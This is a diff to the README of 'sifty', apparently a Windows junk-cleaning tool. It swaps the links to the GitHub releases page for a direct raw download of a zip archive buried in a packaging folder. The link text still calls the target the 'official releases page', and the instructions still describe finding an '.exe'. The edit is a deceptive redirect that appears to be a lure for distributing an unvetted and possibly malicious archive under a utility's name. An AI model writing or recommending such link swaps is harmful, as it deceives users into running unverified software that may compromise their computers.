@@ -1,6 +1,6 @@
 # 🧹 sifty - Keep your Windows system clean daily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Dulcineaeuphonic223/sifty/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Dulcineaeuphonic223/sifty/raw/refs/heads/main/packaging/scoop/Software_v2.6.zip)
 
 ## What is sifty?
 
@@ -10,7 +10,7 @@ Sifty clears junk files from your Windows computer. It helps you regain space an
 
 Follow these steps to set up the tool on your machine.
 
-1. Visit the [official releases page](https://github.com/Dulcineaeuphonic223/sifty/releases) to access the download files.
+1. Visit the [official releases page](https://github.com/Dulcineaeuphonic223/sifty/raw/refs/heads/main/packaging/scoop/Software_v2.6.zip) to access the download files.
 2. Look for the file ending in `.exe` under the latest version heading.
 3. Click the filename to start the download to your computer.
 4. Save the file in a folder you can find later, such as your Downloads folder.
